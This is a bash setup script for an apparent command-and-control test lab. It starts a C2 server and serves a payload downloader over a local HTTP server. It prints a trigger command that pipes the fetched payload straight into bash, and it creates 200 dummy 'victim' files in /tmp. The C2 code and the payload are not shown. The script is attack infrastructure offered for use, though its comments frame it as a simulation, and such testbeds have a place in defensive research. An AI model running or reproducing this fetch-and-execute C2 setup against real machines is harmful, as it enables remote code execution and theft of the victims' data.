#!/bin/bash
# Setup: Run as root or with sudo for port binding
cd $(dirname $0)
pip3 install -r requirements.txt  # Install Flask
python3 c2_server.py &  # Start C2 on 0.0.0.0:8080
C2_URL="http://$(hostname -I | awk '{print $1}'):8080"
echo "C2 running at $C2_URL"
# Host payload_downloader.sh via python http.server (port 8000)
nohup python3 -m http.server 8000 > /dev/null 2>&1 &
PAYLOAD_URL="$C2_URL/downloader"  # But actually host payload on 8000, alias for sim
echo "Payload URL for curl: http://$(hostname -I | awk '{print $1}'):8000/payload_downloader.sh"
echo "Test trigger: curl -s http://$(hostname -I | awk '{print $1}'):8000/payload_downloader.sh | bash"
# Create test dir
mkdir -p /tmp/test_victim
for i in {1..200}; do echo "Victim data $i" > "/tmp/test_victim/file$i.dat"; done
echo "Test files ready in /tmp/test_victim"
